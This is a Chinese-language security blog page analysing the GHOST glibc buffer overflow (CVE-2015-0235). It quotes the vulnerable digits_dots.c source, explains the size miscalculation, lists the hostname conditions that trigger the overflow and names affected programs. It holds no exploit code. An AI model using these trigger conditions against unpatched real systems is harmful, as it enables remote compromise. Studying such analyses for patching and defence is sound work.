<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>CVE 2015-0235:Ghost glibc 缓存区溢出漏洞分析 - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="安全脉搏此前发布了最近被媒体炒的比较火的2015年第一个曝出的影响广泛的底层漏洞： CVE-2015-0235：Linux Glibc幽灵漏洞允许黑客远程获取系统权限" />
<meta name="keywords" content="--skip-broken,clockdiff,CVE-2015-0235,digits_dots.c,gethostbyname*(),Ghost glibc,Ghost glibc 缓存区溢出漏洞分析,glibc,glibc 缓存区溢出漏洞分析,ltrace,pppd,procmail,secpulse.c" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/4440.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-4440 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/system/linux" rel="category tag">Linux</a> &gt;  正文 </nav><article id="post-4440" class="post-4440 post type-post status-publish format-standard hentry category-linux tag-skip-broken tag-clockdiff tag-cve-2015-0235 tag-digits_dots-c tag-gethostbyname tag-ghost-glibc tag-ghost-glibc- tag-glibc tag-glibc- tag-ltrace tag-pppd tag-procmail tag-secpulse-c">
	<header class="single-header">
		<h1>CVE 2015-0235:Ghost glibc 缓存区溢出漏洞分析</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /1/30 0:17</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">5,401</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/4440.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p>安全脉搏此前发布了最近被媒体炒的比较火的2015年第一个曝出的影响广泛的底层漏洞： <a href="http://www.secpulse.com/archives/4352.html" target="_blank">CVE-2015-0235：Linux Glibc幽灵漏洞允许黑客远程获取系统权限</a></p>
<h2>一： 概述</h2>
<p><span style="color: #008000;">__nss_hostname_digits_dots(//glibc/nss/digits_dots.c)函数存在缓冲区溢出漏洞。</span></p>
<p><span style="color: #008000;">该bug通过gethostbyname *()系列函数触发，可远程执行。</span></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/01/ghost-linux-security-vulnerability-e1422513239924.png"><img class="alignnone size-full wp-image-4438" src="http://www.secpulse.com/wp-content/uploads/2015/01/ghost-linux-security-vulnerability-e1422513239924.png" alt="ghost-linux-security-vulnerability-e1422513239924" width="727" height="404" /></a></p>
<h2>二：分析</h2>
<p>__nss_hostname_digits_dots() 是从2.2.2开始引入的。</p>
<pre class="lang:python decode:true">root@H:/tmp/glibc-2.17# grep -irF '__nss_hostname_digits_dots' ./*
./CANCEL-FCT-WAIVE:__nss_hostname_digits_dots
./ChangeLog.12:	* nss/Versions (libc): Add __nss_hostname_digits_dots to GLIBC_2.2.2.
./ChangeLog.12:	* nss/digits_dots.c (__nss_hostname_digits_dots): Turn template
---snip---
./nss/getXXbyYY.c:      if (__nss_hostname_digits_dots (name, &amp;resbuf, &amp;buffer,
./nss/Versions:    __nss_hostname_digits_dots;
./nss/getXXbyYY_r.c:  switch (__nss_hostname_digits_dots (name, resbuf, &amp;buffer, NULL,
./nss/nsswitch.h:extern int __nss_hostname_digits_dots (const char *name,
./nss/nsswitch.h:libc_hidden_proto (__nss_hostname_digits_dots)
./nss/digits_dots.c:__nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
./nss/digits_dots.c:libc_hidden_def (__nss_hostname_digits_dots)</pre>
<p>查找得出该函数由glibc的重入和不可重入版本提供(nss/getXXbyYY.c 和 nss/getXXbyYY_r.c)</p>
<pre class="lang:python decode:true ">#ifdef HANDLE_DIGITS_DOTS
  if (buffer != NULL) //if malloc memory success
    {   
      if (__nss_hostname_digits_dots (name, &amp;resbuf, &amp;buffer,
                                      &amp;buffer_size, 0, &amp;result, NULL, AF_VAL,
                                      H_ERRNO_VAR_P))
        goto done;
    }   
#endif</pre>
<p>并由 HANDLE_DIGITS_DOTS 宏来定义</p>
<pre class="lang:python decode:true">root@H:/tmp/glibc-2.17# grep -irF '#define HANDLE_DIGITS_DOTS' ./*
./inet/gethstbynm.c:#define HANDLE_DIGITS_DOTS	1
./inet/gethstbynm2.c:#define HANDLE_DIGITS_DOTS	1
./inet/gethstbynm_r.c:#define HANDLE_DIGITS_DOTS	1
./inet/gethstbynm2_r.c:#define HANDLE_DIGITS_DOTS	1
./nscd/gethstbynm3_r.c:#define HANDLE_DIGITS_DOTS	1</pre>
<p>所以这几个文件对应的函数可能触发该漏洞，__nss_hostname_digits_dots()的目的是避免ipv4和ipv6的地址再去做dns解析导致资源浪费。</p>
<pre class="lang:c decode:true ">/* Copyright (C) 1997, 1999, 2000, 2001, 2004 Free Software Foundation, Inc.
   This file is part of the GNU C Library.
   Contributed by H.J. Lu &lt;hjl@gnu.ai.mit.edu&gt;, 1997.
 
   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.
 
   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.
 
   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, see
   &lt;http://www.gnu.org/licenses/&gt;.  */
 
#include &lt;assert.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;ctype.h&gt;
#include &lt;wctype.h&gt;
#include &lt;resolv.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;
#include "nsswitch.h"
 
#ifdef USE_NSCD
# define inet_aton __inet_aton
# include &lt;nscd/nscd_proto.h&gt;
#endif
 
int
__nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
			    char **buffer, size_t *buffer_size,
			    size_t buflen, struct hostent **result,
			    enum nss_status *status, int af, int *h_errnop)
{
  int save;
 
  /* We have to test for the use of IPv6 which can only be done by
     examining `_res'.  */
  if (__res_maybe_init (&amp;_res, 0) == -1)
    {
      if (h_errnop)
	*h_errnop = NETDB_INTERNAL;
      *result = NULL;
      return -1;
    }
 
  /*
   * disallow names consisting only of digits/dots, unless
   * they end in a dot.
   */
  if (isdigit (name[0]) || isxdigit (name[0]) || name[0] == ':')
    {
      const char *cp;
      char *hostname;
      typedef unsigned char host_addr_t[16];
      host_addr_t *host_addr;
      typedef char *host_addr_list_t[2];
      host_addr_list_t *h_addr_ptrs;
      char **h_alias_ptr;
      size_t size_needed;
      int addr_size;
 
      switch (af)
	{
	case AF_INET:
	  addr_size = INADDRSZ;
	  break;
 
	case AF_INET6:
	  addr_size = IN6ADDRSZ;
	  break;
 
	default:
	  af = (_res.options &amp; RES_USE_INET6) ? AF_INET6 : AF_INET;
	  addr_size = af == AF_INET6 ? IN6ADDRSZ : INADDRSZ;
	  break;
	}
 
      size_needed = (sizeof (*host_addr)
		     + sizeof (*h_addr_ptrs) + strlen (name) + 1);
 
      if (buffer_size == NULL)
        {
	  if (buflen &lt; size_needed)
	    {
	      if (h_errnop != NULL)
		*h_errnop = TRY_AGAIN;
	      __set_errno (ERANGE);
	      goto done;
	    }
	}
      else if (buffer_size != NULL &amp;&amp; *buffer_size &lt; size_needed)
	{
	  char *new_buf;
	  *buffer_size = size_needed;
	  new_buf = (char *) realloc (*buffer, *buffer_size);
 
	  if (new_buf == NULL)
	    {
	      save = errno;
	      free (*buffer);
	      *buffer = NULL;
	      *buffer_size = 0;
	      __set_errno (save);
	      if (h_errnop != NULL)
		*h_errnop = TRY_AGAIN;
	      *result = NULL;
	      goto done;
	    }
	  *buffer = new_buf;
	}
 
      memset (*buffer, '\0', size_needed);
 
      host_addr = (host_addr_t *) *buffer;
      h_addr_ptrs = (host_addr_list_t *)
	((char *) host_addr + sizeof (*host_addr));
      h_alias_ptr = (char **) ((char *) h_addr_ptrs + sizeof (*h_addr_ptrs));
      hostname = (char *) h_alias_ptr + sizeof (*h_alias_ptr);
 
      if (isdigit (name[0]))
	{
	  for (cp = name;; ++cp)
	    {
	      if (*cp == '\0')
		{
		  int ok;
 
		  if (*--cp == '.')
		    break;
 
		  /* All-numeric, no dot at the end. Fake up a hostent as if
		     we'd actually done a lookup.  What if someone types
		     255.255.255.255?  The test below will succeed
		     spuriously... ???  */
		  if (af == AF_INET)
		    ok = __inet_aton (name, (struct in_addr *) host_addr);
		  else
		    {
		      assert (af == AF_INET6);
		      ok = inet_pton (af, name, host_addr) &gt; 0;
		    }
		  if (! ok)
		    {
		      *h_errnop = HOST_NOT_FOUND;
		      if (buffer_size)
			*result = NULL;
		      goto done;
		    }
 
		  resbuf-&gt;h_name = strcpy (hostname, name);
		  h_alias_ptr[0] = NULL;
		  resbuf-&gt;h_aliases = h_alias_ptr;
		  (*h_addr_ptrs)[0] = (char *) host_addr;
		  (*h_addr_ptrs)[1] = NULL;
		  resbuf-&gt;h_addr_list = *h_addr_ptrs;
		  if (af == AF_INET &amp;&amp; (_res.options &amp; RES_USE_INET6))
		    {
		      /* We need to change the IP v4 address into the
			 IP v6 address.  */
		      char tmp[INADDRSZ];
		      char *p = (char *) host_addr;
		      int i;
 
		      /* Save a copy of the IP v4 address. */
		      memcpy (tmp, host_addr, INADDRSZ);
		      /* Mark this ipv6 addr as a mapped ipv4. */
		      for (i = 0; i &lt; 10; i++)
			*p++ = 0x00;
		      *p++ = 0xff;
		      *p++ = 0xff;
		      /* Copy the IP v4 address. */
		      memcpy (p, tmp, INADDRSZ);
		      resbuf-&gt;h_addrtype = AF_INET6;
		      resbuf-&gt;h_length = IN6ADDRSZ;
		    }
		  else
		    {
		      resbuf-&gt;h_addrtype = af;
		      resbuf-&gt;h_length = addr_size;
		    }
		  if (h_errnop != NULL)
		    *h_errnop = NETDB_SUCCESS;
		  if (buffer_size == NULL)
		    *status = NSS_STATUS_SUCCESS;
		  else
		   *result = resbuf;
		  goto done;
		}
 
	      if (!isdigit (*cp) &amp;&amp; *cp != '.')
		break;
	    }
	}
 
      if ((isxdigit (name[0]) &amp;&amp; strchr (name, ':') != NULL) || name[0] == ':')
	{
	  const char *cp;
	  char *hostname;
	  typedef unsigned char host_addr_t[16];
	  host_addr_t *host_addr;
	  typedef char *host_addr_list_t[2];
	  host_addr_list_t *h_addr_ptrs;
	  size_t size_needed;
	  int addr_size;
 
	  switch (af)
	    {
	    default:
	      af = (_res.options &amp; RES_USE_INET6) ? AF_INET6 : AF_INET;
	      if (af == AF_INET6)
		{
		  addr_size = IN6ADDRSZ;
		  break;
		}
	      /* FALLTHROUGH */
 
	    case AF_INET:
	      /* This is not possible.  We cannot represent an IPv6 address
		 in an `struct in_addr' variable.  */
	      *h_errnop = HOST_NOT_FOUND;
	      *result = NULL;
	      goto done;
 
	    case AF_INET6:
	      addr_size = IN6ADDRSZ;
	      break;
	    }
 
	  size_needed = (sizeof (*host_addr)
			 + sizeof (*h_addr_ptrs) + strlen (name) + 1);
 
	  if (buffer_size == NULL &amp;&amp; buflen &lt; size_needed)
	    {
	      if (h_errnop != NULL)
		*h_errnop = TRY_AGAIN;
	      __set_errno (ERANGE);
	      goto done;
	    }
	  else if (buffer_size != NULL &amp;&amp; *buffer_size &lt; size_needed)
	    {
	      char *new_buf;
	      *buffer_size = size_needed;
	      new_buf = realloc (*buffer, *buffer_size);
 
	      if (new_buf == NULL)
		{
		  save = errno;
		  free (*buffer);
		  __set_errno (save);
		  *buffer = NULL;
		  *buffer_size = 0;
		  *result = NULL;
		  goto done;
		}
	      *buffer = new_buf;
	    }
 
	  memset (*buffer, '\0', size_needed);
 
	  host_addr = (host_addr_t *) *buffer;
	  h_addr_ptrs = (host_addr_list_t *)
	    ((char *) host_addr + sizeof (*host_addr));
	  hostname = (char *) h_addr_ptrs + sizeof (*h_addr_ptrs);
 
	  for (cp = name;; ++cp)
	    {
	      if (!*cp)
		{
		  if (*--cp == '.')
		    break;
 
		  /* All-IPv6-legal, no dot at the end. Fake up a
		     hostent as if we'd actually done a lookup.  */
		  if (inet_pton (AF_INET6, name, host_addr) &lt;= 0)
		    {
		      *h_errnop = HOST_NOT_FOUND;
		      if (buffer_size)
			*result = NULL;
		      goto done;
		    }
 
		  resbuf-&gt;h_name = strcpy (hostname, name);
		  h_alias_ptr[0] = NULL;
		  resbuf-&gt;h_aliases = h_alias_ptr;
		  (*h_addr_ptrs)[0] = (char *) host_addr;
		  (*h_addr_ptrs)[1] = (char *) 0;
		  resbuf-&gt;h_addr_list = *h_addr_ptrs;
		  resbuf-&gt;h_addrtype = AF_INET6;
		  resbuf-&gt;h_length = addr_size;
		  *h_errnop = NETDB_SUCCESS;
		  if (buffer_size == NULL)
		    *status = NSS_STATUS_SUCCESS;
		  else
		    *result = resbuf;
		  goto done;
		}
 
	      if (!isxdigit (*cp) &amp;&amp; *cp != ':' &amp;&amp; *cp != '.')
		break;
	    }
	}
    }
 
  return 0;
 
done:
  return 1;
}
libc_hidden_def (__nss_hostname_digits_dots)</pre>
<p>&nbsp;</p>
<p>85行size_needed决定了缓存区的大小 只包括了 *host_addr, *h_addr_ptrs, name的大小，后面121行却存储着四个数据的地址，host_addr, h_addr_ptrs, h_alias_ptr, hostname, 在计算长度时漏掉了h_alias_ptr，即一个char指针的大小，32位为4个字节，64位为8个字节。88-117行保证缓存区足够大，88-97行是函数重入的分支，98-117是非重入的分支。157行的strcpy可以触发缓存区溢出。</p>
<p>为了在157行触发溢出，主机名必须符合下列条件：</p>
<pre class="lang:python decode:true ">- 它的第一个字符必须是数字(Ln 127) 。
 - 它的最后一个字符不能是点 “.”(Ln 135 ) 。
 - 它必须只包含数字和点(Ln 197 ) (我们称之为“数字和点”的要求) 。
 - 它必须足够长以溢出缓冲区。例如，非重入的gethostbyname *()函数最开始就会通过调用malloc (1024)来分配自己的缓冲区 (申请 “1 KB”) 。
 - 地址必须成功地解析为IPv4地址。该解析由INET_ATON()(Ln 143)完成 ，或作为inet_pton IPv6地址() (Ln 147)</pre>
<p>但是经过分析inet_pton 和 inet_aton 这2个函数，得出如下结论(200行出的strcpy是处理ipv6的，由于ipv6的限制，不能触发溢出。)</p>
<pre class="lang:python decode:true"> 147行的inet_ption中当吧hostname解析为ipv6的地址时，':'是不非法字符，所以地址族为AF_INET6时，是不会触发的。
  
  inet_aton处是唯一一处可以出发溢出的，并且主机名必须具有一下格式："a.b.c.d","a.b.c","a"，a,b,c,d 必须是无符号整数，最大0xffffffff,可以被strtoul函数成功的转换为10进制或8进制(由于'x'和'X'在此处是非法字符，所以不能为16进制）
</pre>
<p>&nbsp;</p>
<h2>三：案例分析</h2>
<p>目前为止，下面的程序被证实存在该漏洞</p>
<ul>
<li>clockdiff</li>
<li>procmail（through its comsat/biff feature)</li>
<li>pppd</li>
<li>Exim mail server (if configured with the “helo_verify_hosts” or “helo_try_verify_hosts” option)</li>
</ul>
